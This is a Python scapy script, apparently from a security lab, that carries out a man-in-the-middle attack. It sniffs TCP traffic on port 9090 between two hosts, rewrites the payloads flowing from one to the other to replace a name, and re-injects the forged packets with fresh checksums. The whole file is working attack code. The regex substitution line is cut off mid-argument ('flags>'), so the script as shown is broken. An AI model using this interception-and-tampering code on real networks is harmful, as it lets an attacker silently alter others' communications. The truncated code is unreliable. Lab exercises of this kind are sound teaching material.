#!/usr/bin/env python3
from scapy.all import *
import re

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

IP_M = "10.9.0.105"
MAC_M = get_if_hwaddr("eth0")

YOUR_NAME = "Brandon"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load

            try:
                original_str = data.decode()
                modified_str = re.sub(YOUR_NAME, 'A' * len(YOUR_NAME), original_str, flags>

                if original_str != modified_str:
                    print(f"[A->B] Original: {repr(original_str)}")
                    print(f"[A->B] Modified: {repr(modified_str)}")

                send(newpkt/modified_str.encode(), verbose=False)
            except:
                send(newpkt/data, verbose=False)
        else:
            send(newpkt, verbose=False)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt, verbose=False)

f = f'tcp port 9090 and (ether src {MAC_A} or ether src {MAC_B})'
print(f"Filter: {f}")
print("Sniffing...")

pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
